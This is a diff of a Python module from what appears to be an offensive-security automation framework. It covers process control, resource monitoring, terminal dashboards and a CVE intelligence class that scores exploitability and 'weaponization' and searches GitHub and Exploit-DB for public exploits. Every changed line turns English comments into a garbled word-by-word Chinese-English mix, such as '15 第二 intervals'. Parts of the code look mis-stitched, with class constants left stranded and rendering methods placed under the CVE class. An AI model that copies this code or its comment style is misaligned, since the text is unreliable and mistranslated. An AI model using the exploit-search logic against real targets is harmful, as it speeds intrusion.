         elif (resource_usage["cpu_percent"] < 60 and
               resource_usage["memory_percent"] < 70 and
               pool_stats["queue_size"] > 2):
@@ -5437,7 +5437,7 @@ class EnhancedProcessManager:
                 logger.info(f" Auto-scaled up due to available resources and demand")
 
     def get_comprehensive_stats(self) -> Dict[str, Any]:
-        """Get comprehensive system and process statistics"""
+        """获取 综合 系统 与 进程 统计"""
         return {
             "process_pool": self.process_pool.get_pool_stats(),
             "cache": self.cache.get_stats(),
@@ -5449,7 +5449,7 @@ class EnhancedProcessManager:
         }
 
 class ResourceMonitor:
-    """Advanced resource monitoring with historical tracking"""
+    """高级 resource 监控 使用 historical tracking"""
 
     def __init__(self, history_size=100):
         self.history_size = history_size
@@ -5457,7 +5457,7 @@ class ResourceMonitor:
         self.history_lock = threading.Lock()
 
     def get_current_usage(self) -> Dict[str, float]:
-        """Get current system resource usage"""
+        """获取 current 系统 resource usage"""
         try:
             cpu_percent = psutil.cpu_percent(interval=1)
             memory = psutil.virtual_memory()
@@ -5475,7 +5475,7 @@ class ResourceMonitor:
                 "timestamp": time.time()
             }
 
-            # Add to history
+            # Add 到 history
             with self.history_lock:
                 self.usage_history.append(usage)
                 if len(self.usage_history) > self.history_size:
@@ -5497,7 +5497,7 @@ class ResourceMonitor:
             }
 
     def get_process_usage(self, pid: int) -> Dict[str, Any]:
-        """Get resource usage for specific process"""
+        """获取 resource usage 用于 specific 进程"""
         try:
             process = psutil.Process(pid)
             return {
@@ -5511,12 +5511,12 @@ class ResourceMonitor:
             return {}
 
     def get_usage_trends(self) -> Dict[str, Any]:
-        """Get resource usage trends"""
+        """获取 resource usage trends"""
         with self.history_lock:
             if len(self.usage_history) < 2:
                 return {}
 
-            recent = self.usage_history[-10:]  # Last 10 measurements
+            recent = self.usage_history[-10:]  # 最后 10 measurements
 
             cpu_trend = sum(u["cpu_percent"] for u in recent) / len(recent)
             memory_trend = sum(u["memory_percent"] for u in recent) / len(recent)
@@ -5525,11 +5525,11 @@ class ResourceMonitor:
                 "cpu_avg_10": cpu_trend,
                 "memory_avg_10": memory_trend,
                 "measurements": len(self.usage_history),
-                "trend_period_minutes": len(recent) * 15 / 60  # 15 second intervals
+                "trend_period_minutes": len(recent) * 15 / 60  # 15 第二 intervals
             }
 
 class PerformanceDashboard:
-    """Real-time performance monitoring dashboard"""
+    """Real-time performance 监控 dashboard"""
 
     def __init__(self):
         self.execution_history = []
@@ -5538,10 +5538,10 @@ class PerformanceDashboard:
         self.max_history = 1000
 
     def record_execution(self, command: str, result: Dict[str, Any]):
-        """Record command execution for performance tracking"""
+        """Record 命令 execution 用于 performance tracking"""
         with self.dashboard_lock:
             execution_record = {
-                "command": command[:100],  # Truncate long commands
+                "command": command[:100],  # Truncate long 命令
                 "success": result.get("success", False),
                 "execution_time": result.get("execution_time", 0),
                 "return_code": result.get("return_code", -1),
@@ -5553,19 +5553,19 @@ class PerformanceDashboard:
                 self.execution_history.pop(0)
 
     def update_system_metrics(self, metrics: Dict[str, Any]):
-        """Update system metrics for dashboard"""
+        """更新 系统 指标 用于 dashboard"""
         with self.dashboard_lock:
             self.system_metrics.append(metrics)
             if len(self.system_metrics) > self.max_history:
                 self.system_metrics.pop(0)
 
     def get_summary(self) -> Dict[str, Any]:
-        """Get performance summary"""
+        """获取 performance summary"""
         with self.dashboard_lock:
             if not self.execution_history:
                 return {"executions": 0}
 
-            recent_executions = self.execution_history[-100:]  # Last 100 executions
+            recent_executions = self.execution_history[-100:]  # 最后 100 executions
 
             total_executions = len(recent_executions)
             successful_executions = sum(1 for e in recent_executions if e["success"])
@@ -5579,7 +5579,7 @@ class PerformanceDashboard:
                 "system_metrics_count": len(self.system_metrics)
             }
 
-# Global instances
+# 全局 instances
 tech_detector = TechnologyDetector()
 rate_limiter = RateLimitDetector()
 failure_recovery = FailureRecoverySystem()
@@ -5587,26 +5587,26 @@ performance_monitor = PerformanceMonitor()
 parameter_optimizer = ParameterOptimizer()
 enhanced_process_manager = EnhancedProcessManager()
 
-# Global CTF framework instances
+# 全局 CTF 框架 instances
 ctf_manager = CTFWorkflowManager()
 ctf_tools = CTFToolManager()
 ctf_automator = CTFChallengeAutomator()
 ctf_coordinator = CTFTeamCoordinator()
 
 # ============================================================================
-# PROCESS MANAGEMENT FOR COMMAND TERMINATION (v5.0 ENHANCEMENT)
+# 进程 MANAGEMENT 用于 命令 TERMINATION (v5.0 ENHANCEMENT)
 # ============================================================================
 
-# Process management for command termination
-active_processes = {}  # pid -> process info
+# 进程 management 用于 命令 termination
+active_processes = {}  # pid -> 进程 info
 process_lock = threading.Lock()
 
 class ProcessManager:
-    """Enhanced process manager for command termination and monitoring"""
+    """增强 进程 manager 用于 命令 termination 与 监控"""
 
     @staticmethod
     def register_process(pid, command, process_obj):
-        """Register a new active process"""
+        """Register a new active 进程"""
         with process_lock:
             active_processes[pid] = {
                 "pid": pid,
@@ -5622,7 +5622,7 @@ class ProcessManager:
 
     @staticmethod
     def update_process_progress(pid, progress, last_output="", bytes_processed=0):
-        """Update process progress and stats"""
+        """更新 进程 progress 与 stats"""
         with process_lock:
             if pid in active_processes:
                 active_processes[pid]["progress"] = progress
@@ -5630,7 +5630,7 @@ class ProcessManager:
                 active_processes[pid]["bytes_processed"] = bytes_processed
                 runtime = time.time() - active_processes[pid]["start_time"]
 
-                # Calculate ETA if progress > 0
+                # 计算 ETA 如果 progress > 0
                 eta = 0
                 if progress > 0:
                     eta = (runtime / progress) * (1.0 - progress)
@@ -5640,7 +5640,7 @@ class ProcessManager:
 
     @staticmethod
     def terminate_process(pid):
-        """Terminate a specific process"""
+        """Terminate a specific 进程"""
         with process_lock:
             if pid in active_processes:
                 process_info = active_processes[pid]
@@ -5648,9 +5648,9 @@ class ProcessManager:
                     process_obj = process_info["process"]
                     if process_obj and process_obj.poll() is None:
                         process_obj.terminate()
-                        time.sleep(1)  # Give it a chance to terminate gracefully
+                        time.sleep(1)  # Give it a chance 到 terminate gracefully
                         if process_obj.poll() is None:
-                            process_obj.kill()  # Force kill if still running
+                            process_obj.kill()  # Force kill 如果 still running
 
                         active_processes[pid]["status"] = "terminated"
                         logger.warning(f" TERMINATED: Process {pid} - {process_info['command'][:50]}...")
@@ -5662,7 +5662,7 @@ class ProcessManager:
 
     @staticmethod
     def cleanup_process(pid):
-        """Remove process from active registry"""
+        """Remove 进程 来自 active registry"""
         with process_lock:
             if pid in active_processes:
                 process_info = active_processes.pop(pid)
@@ -5672,19 +5672,19 @@ class ProcessManager:
 
     @staticmethod
     def get_process_status(pid):
-        """Get status of a specific process"""
+        """获取 状态 的 a specific 进程"""
         with process_lock:
             return active_processes.get(pid, None)
 
     @staticmethod
     def list_active_processes():
-        """List all active processes"""
+        """列出 全部 active processes"""
         with process_lock:
             return dict(active_processes)
 
     @staticmethod
     def pause_process(pid):
-        """Pause a specific process (SIGSTOP)"""
+        """Pause a specific 进程 (SIGSTOP)"""
         with process_lock:
             if pid in active_processes:
                 try:
@@ -5700,7 +5700,7 @@ class ProcessManager:
 
     @staticmethod
     def resume_process(pid):
-        """Resume a paused process (SIGCONT)"""
+        """Resume a paused 进程 (SIGCONT)"""
         with process_lock:
             if pid in active_processes:
                 try:
@@ -5714,8 +5714,8 @@ class ProcessManager:
                     logger.error(f" Error resuming process {pid}: {str(e)}")
             return False
 
-# Enhanced color codes and visual elements for modern terminal output
-# All color references consolidated to ModernVisualEngine.COLORS for consistency
+# 增强 color codes 与 visual elements 用于 modern terminal 输出
+# 全部 color references consolidated 到 ModernVisualEngine.COLORS 用于 consistency
     BG_GREEN = '\033[42m'
     BG_YELLOW = '\033[43m'
     BG_BLUE = '\033[44m'
@@ -5723,7 +5723,7 @@ class ProcessManager:
     BG_CYAN = '\033[46m'
     BG_WHITE = '\033[47m'
 
-    # Text effects
+    # 说明：Text effects
     DIM = '\033[2m'
     UNDERLINE = '\033[4m'
     BLINK = '\033[5m'
@@ -5731,14 +5731,14 @@ class ProcessManager:
     STRIKETHROUGH = '\033[9m'
 
 class PythonEnvironmentManager:
-    """Manage Python virtual environments and dependencies"""
+    """Manage Python virtual environments 与 dependencies"""
 
     def __init__(self, base_dir: str = "/tmp/hexstrike_envs"):
         self.base_dir = Path(base_dir)
         self.base_dir.mkdir(exist_ok=True)
 
     def create_venv(self, env_name: str) -> Path:
-        """Create a new virtual environment"""
+        """创建 a new virtual environment"""
         env_path = self.base_dir / env_name
         if not env_path.exists():
             logger.info(f" Creating virtual environment: {env_name}")
@@ -5746,7 +5746,7 @@ class PythonEnvironmentManager:
         return env_path
 
     def install_package(self, env_name: str, package: str) -> bool:
-        """Install a package in the specified environment"""
+        """安装 a package 在 the specified environment"""
         env_path = self.create_venv(env_name)
         pip_path = env_path / "bin" / "pip"
 
@@ -5764,19 +5764,19 @@ class PythonEnvironmentManager:
             return False
 
     def get_python_path(self, env_name: str) -> str:
-        """Get Python executable path for environment"""
+        """获取 Python executable path 用于 environment"""
         env_path = self.create_venv(env_name)
         return str(env_path / "bin" / "python")
 
-# Global environment manager
+# 全局 environment manager
 env_manager = PythonEnvironmentManager()
 
 # ============================================================================
-# ADVANCED VULNERABILITY INTELLIGENCE SYSTEM (v6.0 ENHANCEMENT)
+# 高级 漏洞 INTELLIGENCE 系统 (v6.0 ENHANCEMENT)
 # ============================================================================
 
 class CVEIntelligenceManager:
-    """Advanced CVE Intelligence and Vulnerability Management System"""
+    """高级 CVE Intelligence 与 漏洞 Management 系统"""
 
     def __init__(self):
         self.cve_cache = {}
@@ -5785,22 +5785,22 @@ class CVEIntelligenceManager:
 
     @staticmethod
     def create_banner():
-        """Reuse unified ModernVisualEngine banner (legacy hook)."""
+        """说明：Reuse unified ModernVisualEngine banner (legacy hook)."""
         return ModernVisualEngine.create_banner()
 
     @staticmethod
     def render_progress_bar(progress: float, width: int = 40, style: str = 'cyber',
                           label: str = "", eta: float = 0, speed: str = "") -> str:
-        """Render a beautiful progress bar with multiple styles"""
+        """Render a beautiful progress bar 使用 multiple styles"""
 
-        # Clamp progress between 0 and 1
+        # Clamp progress between 0 与 1
         progress = max(0.0, min(1.0, progress))
 
-        # Calculate filled and empty portions
+        # 计算 filled 与 empty portions
         filled_width = int(width * progress)
         empty_width = width - filled_width
 
-        # Style-specific rendering
+        # 说明：Style-specific rendering
         if style == 'cyber':
             filled_char = '█'; empty_char = '░'
             bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
@@ -5818,16 +5818,16 @@ class CVEIntelligenceManager:
             bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
             progress_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']
 
-        # Build the progress bar
+        # 说明：Build the progress bar
         filled_part = bar_color + filled_char * filled_width
         empty_part = ModernVisualEngine.COLORS['TERMINAL_GRAY'] + empty_char * empty_width
         percentage = f"{progress * 100:.1f}%"
 
-        # Add ETA and speed if provided
+        # Add ETA 与 speed 如果 provided
         eta_str = f" | ETA: {eta:.0f}s" if eta > 0 else ""
         speed_str = f" | {speed}" if speed else ""
 
-        # Construct the full progress bar
+        # 说明：Construct the full progress bar
         bar = f"{progress_color}[{filled_part}{empty_part}{ModernVisualEngine.COLORS['RESET']}{progress_color}] {percentage}{eta_str}{speed_str}{ModernVisualEngine.COLORS['RESET']}"
 
         if label:
@@ -5836,7 +5836,7 @@ class CVEIntelligenceManager:
 
     @staticmethod
     def render_vulnerability_card(vuln_data: Dict[str, Any]) -> str:
-        """Render vulnerability as a beautiful card with severity indicators"""
+        """Render 漏洞 as a beautiful card 使用 severity indicators"""
 
         severity = vuln_data.get('severity', 'info').lower()
         title = vuln_data.get('title', 'Unknown Vulnerability')
@@ -5844,10 +5844,10 @@ class CVEIntelligenceManager:
         description = vuln_data.get('description', 'No description available')
         cvss = vuln_data.get('cvss_score', 0.0)
 
-        # Get severity color
+        # 获取 severity color
         severity_color = ModernVisualEngine.COLORS['HACKER_RED'] if severity == 'critical' else ModernVisualEngine.COLORS['HACKER_RED'] if severity == 'high' else ModernVisualEngine.COLORS['CYBER_ORANGE'] if severity == 'medium' else ModernVisualEngine.COLORS['CYBER_ORANGE'] if severity == 'low' else ModernVisualEngine.COLORS['NEON_BLUE']
 
-        # Severity indicators
+        # 说明：Severity indicators
         severity_indicators = {
             'critical': ' CRITICAL',
             'high': '  HIGH',
@@ -5858,7 +5858,7 @@ class CVEIntelligenceManager:
 
         severity_badge = severity_indicators.get(severity, ' UNKNOWN')
 
-        # Create the vulnerability card
+        # 创建 the 漏洞 card
         card = f"""
 {ModernVisualEngine.COLORS['BOLD']}╭─────────────────────────────────────────────────────────────────────────────╮{ModernVisualEngine.COLORS['RESET']}
 {ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {severity_color}{severity_badge}{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['BOLD']}{title[:60]}{ModernVisualEngine.COLORS['RESET']}
@@ -5873,7 +5873,7 @@ class CVEIntelligenceManager:
 
     @staticmethod
     def create_live_dashboard(processes: Dict[int, Dict[str, Any]]) -> str:
-        """Create a live dashboard showing all active processes"""
+        """创建 a live dashboard showing 全部 active processes"""
 
         if not processes:
             return f"{ModernVisualEngine.COLORS['TERMINAL_GRAY']} No active processes{ModernVisualEngine.COLORS['RESET']}"
@@ -5891,7 +5891,7 @@ class CVEIntelligenceManager:
             runtime = proc_info.get('runtime', 0)
             eta = proc_info.get('eta', 0)
 
-            # Status color coding
+            # 状态 color coding
             status_colors = {
                 'running': ModernVisualEngine.COLORS['MATRIX_GREEN'],
                 'paused': ModernVisualEngine.COLORS['WARNING'],
@@ -5900,7 +5900,7 @@ class CVEIntelligenceManager:
             }
             status_color = status_colors.get(status, ModernVisualEngine.COLORS['BRIGHT_WHITE'])
 
-            # Create mini progress bar
+            # 创建 mini progress bar
             mini_bar = ModernVisualEngine.render_progress_bar(
                 progress, width=20, style='cyber', eta=eta
             )
@@ -5916,27 +5916,27 @@ class CVEIntelligenceManager:
 
     @staticmethod
     def format_tool_output(tool: str, output: str, success: bool = True) -> str:
-        """Format tool output with syntax highlighting and structure"""
+        """Format 工具 输出 使用 syntax highlighting 与 structure"""
 
-        # Get tool icon
-        tool_icon = ''  # Default tool icon
+        # 获取 工具 icon
+        tool_icon = ''  # 默认 工具 icon
 
-        # Status indicator
+        # 状态 indicator
         status_icon = "" if success else ""
         status_color = ModernVisualEngine.COLORS['MATRIX_GREEN'] if success else ModernVisualEngine.COLORS['HACKER_RED']
 
-        # Format the output with structure
+        # Format the 输出 使用 structure
         formatted_output = f"""
 {ModernVisualEngine.COLORS['BOLD']}╭─ {tool_icon} {tool.upper()} OUTPUT ─────────────────────────────────────────────╮{ModernVisualEngine.COLORS['RESET']}
 {ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {status_color}{status_icon} Status: {'SUCCESS' if success else 'FAILED'}{ModernVisualEngine.COLORS['RESET']}
 {ModernVisualEngine.COLORS['BOLD']}├─────────────────────────────────────────────────────────────────────────────┤{ModernVisualEngine.COLORS['RESET']}
 """
 
-        # Process output lines with syntax highlighting
+        # 进程 输出 lines 使用 syntax highlighting
         lines = output.split('\n')
-        for line in lines[:20]:  # Limit to first 20 lines for readability
+        for line in lines[:20]:  # Limit 到 第一 20 lines 用于 readability
             if line.strip():
-                # Basic syntax highlighting
+                # 基础 syntax highlighting
                 if any(keyword in line.lower() for keyword in ['error', 'failed', 'denied']):
                     formatted_output += f"{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['ERROR']}{line[:75]}{ModernVisualEngine.COLORS['RESET']}\n"
                 elif any(keyword in line.lower() for keyword in ['found', 'discovered', 'vulnerable']):
@@ -5955,7 +5955,7 @@ class CVEIntelligenceManager:
 
     @staticmethod
     def create_summary_report(results: Dict[str, Any]) -> str:
-        """Generate a beautiful summary report"""
+        """生成 a beautiful summary report"""
 
         total_vulns = len(results.get('vulnerabilities', []))
         critical_vulns = len([v for v in results.get('vulnerabilities', []) if v.get('severity') == 'critical'])
@@ -5981,27 +5981,27 @@ class CVEIntelligenceManager:
         return report
 
     def fetch_latest_cves(self, hours=24, severity_filter="HIGH,CRITICAL"):
-        """Fetch latest CVEs from NVD and other real sources"""
+        """Fetch latest CVEs 来自 NVD 与 other real sources"""
         try:
             logger.info(f" Fetching CVEs from last {hours} hours with severity: {severity_filter}")
             
-            # Calculate date range for CVE search
+            # 计算 date range 用于 CVE search
             end_date = datetime.now()
             start_date = end_date - timedelta(hours=hours)
             
-            # Format dates for NVD API (ISO 8601 format)
+            # Format dates 用于 NVD API (ISO 8601 format)
             start_date_str = start_date.strftime('%Y-%m-%dT%H:%M:%S.000')
             end_date_str = end_date.strftime('%Y-%m-%dT%H:%M:%S.000')
             
-            # NVD API endpoint
+            # NVD API 端点
             nvd_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
             
-            # Parse severity filter
+            # 解析 severity filter
             severity_levels = [s.strip().upper() for s in severity_filter.split(",")]
             
             all_cves = []
             
-            # Query NVD API with rate limiting compliance
+            # Query NVD API 使用 rate limiting compliance
             params = {
                 'lastModStartDate': start_date_str,
                 'lastModEndDate': end_date_str,
@@ -6009,7 +6009,7 @@ class CVEIntelligenceManager:
             }
             
             try:
-                # Add delay to respect NVD rate limits (6 seconds between requests for unauthenticated)
+                # Add delay 到 respect NVD rate limits (6 seconds between 请求 用于 unauthenticated)
                 import time
                 
                 logger.info(f" Querying NVD API: {nvd_url}")
@@ -6025,12 +6025,12 @@ class CVEIntelligenceManager:
                         cve_data = vuln_item.get('cve', {})
                         cve_id = cve_data.get('id', 'Unknown')
                         
-                        # Extract CVSS scores and determine severity
+                        # Extract CVSS scores 与 判断 severity
                         metrics = cve_data.get('metrics', {})
                         cvss_score = 0.0
                         severity = "UNKNOWN"
                         
-                        # Try CVSS v3.1 first, then v3.0, then v2.0
+                        # Try CVSS v3.1 第一, then v3.0, then v2.0
                         if 'cvssMetricV31' in metrics and metrics['cvssMetricV31']:
                             cvss_data = metrics['cvssMetricV31'][0]['cvssData']
                             cvss_score = cvss_data.get('baseScore', 0.0)
@@ -6042,7 +6042,7 @@ class CVEIntelligenceManager:
                         elif 'cvssMetricV2' in metrics and metrics['cvssMetricV2']:
                             cvss_data = metrics['cvssMetricV2'][0]['cvssData']
                             cvss_score = cvss_data.get('baseScore', 0.0)
-                            # Convert CVSS v2 score to severity
+                            # 转换 CVSS v2 评分 到 severity
                             if cvss_score >= 9.0:
                                 severity = "CRITICAL"
                             elif cvss_score >= 7.0:
@@ -6052,11 +6052,11 @@ class CVEIntelligenceManager:
                             else:
                                 severity = "LOW"
                         
-                        # Filter by severity if specified
+                        # 过滤 由 severity 如果 specified
                         if severity not in severity_levels and severity_levels != ['ALL']:
                             continue
                         
-                        # Extract description
+                        # 说明：Extract description
                         descriptions = cve_data.get('descriptions', [])
                         description = "No description available"
                         for desc in descriptions:
@@ -6064,23 +6064,23 @@ class CVEIntelligenceManager:
                                 description = desc.get('value', description)
                                 break
                         
-                        # Extract references
+                        # 说明：Extract references
                         references = []
                         ref_data = cve_data.get('references', [])
-                        for ref in ref_data[:5]:  # Limit to first 5 references
+                        for ref in ref_data[:5]:  # Limit 到 第一 5 references
                             references.append(ref.get('url', ''))
                         
-                        # Extract affected software (CPE data)
+                        # 说明：Extract affected software (CPE data)
                         affected_software = []
                         configurations = cve_data.get('configurations', [])
                         for config in configurations:
                             nodes = config.get('nodes', [])
                             for node in nodes:
                                 cpe_match = node.get('cpeMatch', [])
-                                for cpe in cpe_match[:3]:  # Limit to first 3 CPEs
+                                for cpe in cpe_match[:3]:  # Limit 到 第一 3 CPEs
                                     cpe_name = cpe.get('criteria', '')
                                     if cpe_name.startswith('cpe:2.3:'):
-                                        # Parse CPE to get readable software name
+                                        # 解析 CPE 到 获取 readable software name
                                         parts = cpe_name.split(':')
                                         if len(parts) >= 6:
                                             vendor = parts[3]
@@ -6095,7 +6095,7 @@ class CVEIntelligenceManager:
                             "cvss_score": cvss_score,
                             "published_date": cve_data.get('published', ''),
                             "last_modified": cve_data.get('lastModified', ''),
-                            "affected_software": affected_software[:5],  # Limit to 5 entries
+                            "affected_software": affected_software[:5],  # Limit 到 5 entries
                             "references": references,
                             "source": "NVD"
                         }
@@ -6108,11 +6108,11 @@ class CVEIntelligenceManager:
             except requests.exceptions.RequestException as e:
                 logger.error(f" Error querying NVD API: {str(e)}")
             
-            # If no CVEs found from NVD, try alternative sources or provide informative response
+            # 如果 no CVEs found 来自 NVD, try alternative sources 或 provide informative 响应
             if not all_cves:
                 logger.info(" No recent CVEs found in specified timeframe, checking for any recent critical CVEs...")
                 
-                # Try a broader search for recent critical CVEs (last 7 days)
+                # Try a broader search 用于 最近 严重 CVEs (最后 7 days)
                 try:
                     broader_start = (datetime.now() - timedelta(days=7)).strftime('%Y-%m-%dT%H:%M:%S.000')
                     broader_params = {
@@ -6122,18 +6122,18 @@ class CVEIntelligenceManager:
                         'resultsPerPage': 20
                     }
                     
-                    time.sleep(6)  # Rate limit compliance
+                    time.sleep(6)  # 说明：Rate limit compliance
                     response = requests.get(nvd_url, params=broader_params, timeout=30)
                     
                     if response.status_code == 200:
                         nvd_data = response.json()
                         vulnerabilities = nvd_data.get('vulnerabilities', [])
                         
-                        for vuln_item in vulnerabilities[:10]:  # Limit to 10 most recent
+                        for vuln_item in vulnerabilities[:10]:  # Limit 到 10 most 最近
                             cve_data = vuln_item.get('cve', {})
                             cve_id = cve_data.get('id', 'Unknown')
                             
-                            # Extract basic info for recent critical CVEs
+                            # Extract 基础 info 用于 最近 严重 CVEs
                             descriptions = cve_data.get('descriptions', [])
                             description = "No description available"
                             for desc in descriptions:
@@ -6185,11 +6185,11 @@ class CVEIntelligenceManager:
             }
 
     def analyze_cve_exploitability(self, cve_id):
-        """Analyze CVE exploitability using real CVE data and threat intelligence"""
+        """分析 CVE exploitability using real CVE data 与 threat intelligence"""
         try:
             logger.info(f" Analyzing exploitability for {cve_id}")
             
-            # Fetch detailed CVE data from NVD
+            # Fetch detailed CVE data 来自 NVD
             nvd_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0"
             params = {'cveId': cve_id}
             
@@ -6219,7 +6219,7 @@ class CVEIntelligenceManager:
                 
                 cve_data = vulnerabilities[0].get('cve', {})
                 
-                # Extract CVSS metrics for exploitability analysis
+                # Extract CVSS 指标 用于 exploitability 分析
                 metrics = cve_data.get('metrics', {})
                 cvss_score = 0.0
                 severity = "UNKNOWN"
@@ -6229,7 +6229,7 @@ class CVEIntelligenceManager:
                 user_interaction = "UNKNOWN"
                 exploitability_subscore = 0.0
                 
-                # Analyze CVSS v3.1 metrics (preferred)
+                # 分析 CVSS v3.1 指标 (preferred)
                 if 'cvssMetricV31' in metrics and metrics['cvssMetricV31']:
                     cvss_data = metrics['cvssMetricV31'][0]['cvssData']
                     cvss_score = cvss_data.get('baseScore', 0.0)
@@ -6250,17 +6250,17 @@ class CVEIntelligenceManager:
                     user_interaction = cvss_data.get('userInteraction', 'UNKNOWN')
                     exploitability_subscore = cvss_data.get('exploitabilityScore', 0.0)
                 
-                # Calculate exploitability score based on CVSS metrics
+                # 计算 exploitability 评分 based 在 CVSS 指标
                 exploitability_score = 0.0
                 
-                # Base exploitability on CVSS exploitability subscore if available
+                # Base exploitability 在 CVSS exploitability subscore 如果 available
                 if exploitability_subscore > 0:
-                    exploitability_score = min(exploitability_subscore / 3.9, 1.0)  # Normalize to 0-1
+                    exploitability_score = min(exploitability_subscore / 3.9, 1.0)  # Normalize 到 0-1
                 else:
-                    # Calculate based on individual CVSS components
+                    # 计算 based 在 individual CVSS components
                     score_components = 0.0
                     
-                    # Attack Vector scoring
+                    # 说明：Attack Vector scoring
                     if attack_vector == "NETWORK":
                         score_components += 0.4
                     elif attack_vector == "ADJACENT_NETWORK":
@@ -6270,25 +6270,25 @@ class CVEIntelligenceManager:
                     elif attack_vector == "PHYSICAL":
                         score_components += 0.1
                     
-                    # Attack Complexity scoring
+                    # 说明：Attack Complexity scoring
                     if attack_complexity == "LOW":
                         score_components += 0.3
                     elif attack_complexity == "HIGH":
                         score_components += 0.1
                     
-                    # Privileges Required scoring
+                    # 说明：Privileges Required scoring
                     if privileges_required == "NONE":
                         score_components += 0.2
                     elif privileges_required == "LOW":
                         score_components += 0.1
                     
-                    # User Interaction scoring
+                    # 说明：User Interaction scoring
                     if user_interaction == "NONE":
                         score_components += 0.1
                     
                     exploitability_score = min(score_components, 1.0)
                 
-                # Determine exploitability level
+                # 判断 exploitability level
                 if exploitability_score >= 0.8:
                     exploitability_level = "HIGH"
                 elif exploitability_score >= 0.6:
@@ -6298,7 +6298,7 @@ class CVEIntelligenceManager:
                 else:
                     exploitability_level = "VERY_LOW"
                 
-                # Extract description for additional context
+                # Extract description 用于 附加 context
                 descriptions = cve_data.get('descriptions', [])
                 description = ""
                 for desc in descriptions:
@@ -6306,7 +6306,7 @@ class CVEIntelligenceManager:
                         description = desc.get('value', '')
                         break
                 
-                # Analyze description for exploit indicators
+                # 分析 description 用于 利用 indicators
                 exploit_keywords = [
                     'remote code execution', 'rce', 'buffer overflow', 'stack overflow',
                     'heap overflow', 'use after free', 'double free', 'format string',
@@ -6318,17 +6318,17 @@ class CVEIntelligenceManager:
                 description_lower = description.lower()
                 exploit_indicators = [kw for kw in exploit_keywords if kw in description_lower]
                 
-                # Adjust exploitability based on vulnerability type
+                # Adjust exploitability based 在 漏洞 类型
                 if any(kw in description_lower for kw in ['remote code execution', 'rce', 'buffer overflow']):
                     exploitability_score = min(exploitability_score + 0.2, 1.0)
                 elif any(kw in description_lower for kw in ['authentication bypass', 'privilege escalation']):
                     exploitability_score = min(exploitability_score + 0.15, 1.0)
                 
-                # Check for public exploit availability indicators
+                # 检查 用于 public 利用 availability indicators
                 public_exploits = False
                 exploit_maturity = "UNKNOWN"
                 
-                # Look for exploit references in CVE references
+                # Look 用于 利用 references 在 CVE references
                 references = cve_data.get('references', [])
                 exploit_sources = ['exploit-db.com', 'github.com', 'packetstormsecurity.com', 'metasploit']
                 
@@ -6339,7 +6339,7 @@ class CVEIntelligenceManager:
                         exploit_maturity = "PROOF_OF_CONCEPT"
                         break
                 
-                # Determine weaponization level
+                # 判断 weaponization level
                 weaponization_level = "LOW"
                 if public_exploits and exploitability_score > 0.7:
                     weaponization_level = "HIGH"
@@ -6348,14 +6348,14 @@ class CVEIntelligenceManager:
                 elif exploitability_score > 0.8:
                     weaponization_level = "MEDIUM"
                 
-                # Active exploitation assessment
+                # 说明：Active exploitation assessment
                 active_exploitation = False
                 if exploitability_score > 0.8 and public_exploits:
                     active_exploitation = True
                 elif severity in ["CRITICAL", "HIGH"] and attack_vector == "NETWORK":
                     active_exploitation = True
                 
-                # Priority recommendation
+                # 说明：Priority recommendation
                 if exploitability_score > 0.8 and severity == "CRITICAL":
                     priority = "IMMEDIATE"
                 elif exploitability_score > 0.7 or severity == "CRITICAL":
@@ -6365,7 +6365,7 @@ class CVEIntelligenceManager:
                 else:
                     priority = "LOW"
                 
-                # Extract publication and modification dates
+                # Extract publication 与 modification dates
                 published_date = cve_data.get('published', '')
                 last_modified = cve_data.get('lastModified', '')
                 
@@ -6423,18 +6423,18 @@ class CVEIntelligenceManager:
             }
 
     def search_existing_exploits(self, cve_id):
-        """Search for existing exploits from real sources"""
+        """Search 用于 existing exploits 来自 real sources"""
         try:
             logger.info(f" Searching existing exploits for {cve_id}")
             
             all_exploits = []
             sources_searched = []
             
-            # 1. Search GitHub for PoCs and exploits
+            # 1. Search GitHub 用于 PoCs 与 exploits
             try:
                 logger.info(f" Searching GitHub for {cve_id} exploits...")
                 
-                # GitHub Search API
+                # 说明：GitHub Search API
                 github_search_url = "https://api.github.com/search/repositories"
                 github_params = {
                     'q': f'{cve_id} exploit poc vulnerability',
@@ -6449,8 +6449,8 @@ class CVEIntelligenceManager:
                     github_data = github_response.json()
                     repositories = github_data.get('items', [])
                     
-                    for repo in repositories[:5]:  # Limit to top 5 results
-                        # Check if CVE is actually mentioned in repo name or description
+                    for repo in repositories[:5]:  # Limit 到 top 5 结果
+                        # 检查 如果 CVE is actually mentioned 在 repo name 或 description
                         repo_name = repo.get('name', '').lower()
                         repo_desc = repo.get('description', '').lower()
                         
@@ -6472,7 +6472,7 @@ class CVEIntelligenceManager:
                                 "reliability": "UNVERIFIED"
                             }
                             
-                            # Assess reliability based on repo metrics
+                            # Assess reliability based 在 repo 指标
                             stars = repo.get('stargazers_count', 0)
                             forks = repo.get('forks_count', 0)
                             
@@ -6492,19 +6492,19 @@ class CVEIntelligenceManager:
             except requests.exceptions.RequestException as e:
                 logger.error(f" GitHub search error: {str(e)}")
             
-            # 2. Search Exploit-DB via searchsploit-like functionality
+            # 2. Search 利用-DB via searchsploit-like functionality
             try:
                 logger.info(f" Searching for {cve_id} in exploit databases...")
                 
-                # Since we can't directly access Exploit-DB API, we'll use a web search approach
-                # or check if the CVE references contain exploit-db links
+                # Since we can't directly access 利用-DB API, we'll use a web search approach
+                # 或 检查 如果 the CVE references contain 利用-db links
                 
-                # First, get CVE data to check references
+                # 第一, 获取 CVE data 到 检查 references
                 nvd_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
                 nvd_params = {'cveId': cve_id}
                 
                 import time
-                time.sleep(1)  # Rate limiting
+                time.sleep(1)  # 说明：Rate limiting
                 
                 nvd_response = requests.get(nvd_url, params=nvd_params, timeout=20)
                 
@@ -6516,7 +6516,7 @@ class CVEIntelligenceManager:
                         cve_data = vulnerabilities[0].get('cve', {})
                         references = cve_data.get('references', [])
                         
-                        # Check references for exploit sources
+                        # 检查 references 用于 利用 sources
                         exploit_sources = {
